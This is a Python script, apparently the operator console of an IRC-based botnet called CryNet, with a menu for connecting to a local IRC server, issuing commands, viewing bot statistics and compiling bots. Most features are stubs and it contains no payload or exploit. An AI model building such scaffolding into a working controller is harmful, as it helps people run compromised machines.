import sys
from colorama import init, Cursor

from MasterIrcClient import MasterIrcClient
#from CommandCenter import CommandCenter

USER_INPUT = "Enter command: "
VALIDATE_PASSPHRASE = "test"  # TODO read in from config

class TerminalBuffer:
    def __init__(self):
        self.lines = []

    def write(self, message):
        sys.__stdout__.write(message)
        sys.__stdout__.flush()
        self.lines.append(message)
        if len(self.lines) > 1000:  # Limit buffer size if needed
            self.lines.pop(0)

    def flush(self):
        sys.__stdout__.flush()

    def get_last_line(self):
        return self.lines[-1] if self.lines else None

    def getLines(self):
        return self.lines

buffer = TerminalBuffer()
sys.stdout = buffer

def clearLine():
    sys.stdout.write(Cursor.UP(1) + '\r' + ' ' * 80 + '\r')


SERVER_HOSTNAME = "127.0.0.1"
PORT = 6667

# END OF GLOBAL DECLARATIONS

def connectToIrcServer():
    global isConnected
    global ircClient
    ircClient = MasterIrcClient(SERVER_HOSTNAME, PORT, buffer, clearLine)

    attemptAutoConnect = input("Would you like to attempt an auto-validate and auto-register? (Y/N)")
    isAutoConnecting = attemptAutoConnect == "Y" or attemptAutoConnect == "y"
    ircClient.connect(isAutoConnecting)
    if isAutoConnecting:
        print("If configuration is set correctly, then you should be validated and registered")
        print("Any errors will be flushed when starting an IRC console or command center")
    else:
        print("In order to validate and register to the IRC server, you now must do so via the IRC console or command center")
    isConnected = True
    print(f"Succesfully connected to {SERVER_HOSTNAME}")

def startCommandCenter():
    print("Not yet implemented!")
    #global isConnected
    #global ircClient
    #if not isConnected or ircClient == None:
    #    print("Must connect to IRC server first")
    #    return
    #commandCenter = CommandCenter(ircClient)
    #commandCenter.startCommandCenter()
    

def startIrcConsole():
    global isConnected
    global ircClient
    if not isConnected or ircClient == None:
        print("Must connect to IRC server first")
        return
    if not ircClient.isRunning():
        print("----------------------IRC CONSOLE----------------------")
        print("Welcome to the IRC console, you can enter IRC server commands or general messages.")
        print("(Note: refer to `ServerCommands.md` in the docs folder of the CryNet repo for information on server commands)")
        print("Enter `QUIT_NOW` if you'd like to exist the IRC Console")
        print("Any server responses received before running will be outputted below: ")
        ircClient.run()

def printBotStatistics():
    print("test")



def displayMenu():
    print("~~~~~~~~~~~~~~~~~~~~~~~CryNet Master Options~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("Master options (input number to select option): ")
    print("1. Connect to CryNet IRC server")
    print("2. Enter command center")
    print("3. Enter manual IRC console")
    print("4. View bot staistics")
    print("5. Compile a new bot")

def run(): # Better name?
    while True:
        displayMenu()
        option = input("Option: ").replace(" ", "")

        if option == "1":
            connectToIrcServer()
        elif option == "2":
            startCommandCenter()
        elif option == "3":
            startIrcConsole()  
        elif option == "4":
            print("Not yet implemented!")
        elif option == "5":
            print("Not yet implemented!")
        else:
            print("Invalid option")

def main(): 
    # read in config and do setup

    # set global variables
    global ircClient
    global isConnected
    isConnected = False
    ircClient = None

    run() # run program
  
if __name__=="__main__":
    init() 
    main() 
